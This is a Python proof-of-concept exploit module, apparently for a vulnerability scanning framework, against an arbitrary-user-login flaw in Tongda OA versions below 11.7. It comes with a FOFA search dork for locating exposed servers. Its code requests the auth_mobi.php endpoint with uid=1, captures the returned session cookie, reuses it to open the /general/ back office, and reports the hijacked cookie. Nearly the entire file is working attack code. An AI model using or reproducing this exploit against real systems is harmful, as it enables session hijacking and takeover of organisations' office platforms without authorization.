# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            略
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "通达OA < v11.7 auth_mobi.php 在线用户登录漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "通达OA",                     # 漏洞应用名称
        "AppVersion" : "通达OA < 11.7",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            通达OA（OfficeAnywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，
            是与中国企业管理实践相结合形成的综合管理办公平台。
            
            通达存在任意用户登录漏洞，攻击者可以通过指定接口查询在线用户并获取cookie，导致业务后台失陷。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="TDXK-通达OA"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0" # url自己按需调整
        url1 = self.target + "/general/"

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
            if req0.status_code == 200 and "PHPSESSID" in req0.headers["Set-Cookie"] and len(req0.text.strip()) == 0:
                cookie = req0.headers["Set-Cookie"].split(";")[0].strip()
                headers["Cookie"] = cookie
                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
                if req1.status_code == 200 and "<!--[if IE 6 ]> <html class=\"ie6 lte_ie6 lte_ie7 lte_ie8 lte_ie9\"> <![endif]-->" in req1.text:
                    vuln = [True,"<title> Url: %s | Cookie: %s </title>" % (url1,cookie)]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()